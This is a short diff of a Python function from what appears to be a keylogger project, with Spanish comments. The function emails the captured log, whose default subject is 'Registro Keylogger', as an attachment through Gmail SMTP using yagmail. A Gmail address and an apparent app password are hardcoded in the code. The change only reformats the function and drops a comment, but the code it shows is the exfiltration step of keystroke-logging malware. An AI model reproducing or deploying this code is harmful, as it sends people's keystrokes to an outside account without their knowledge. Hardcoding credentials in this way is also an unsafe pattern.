@@ -1,13 +1,15 @@
 import yagmail
 import traceback
 
-def enviar_email(destinatario: str, archivo_adjunto: str, asunto: str = "Registro Keylogger", cuerpo: str = "Se adjunta el registro."):
-   
+def enviar_email(destinatario: str, archivo_adjunto: str,
+                 asunto: str = "Registro Keylogger", cuerpo: str = "Se adjunta el registro."):
+    """
+    Envía un correo usando yagmail (Gmail/SMTP) con el archivo adjunto.
+    """
     try:
         yag = yagmail.SMTP(
-            user="borrardespuesnoapellido@gmail.com",         # cuenta de gmail
-           # la contrasena generada en contrasena de aplicacion generada no va funcionar hasta que generes la tuya o hacemos otra xd ajajaj
-            password="btmt ktlp dkdp vyhh",
+            user="borrardespuesnoapellido@gmail.com",   
+            password="btmt ktlp dkdp vyhh",              
             host="smtp.gmail.com",
             port=587,
             smtp_starttls=True,
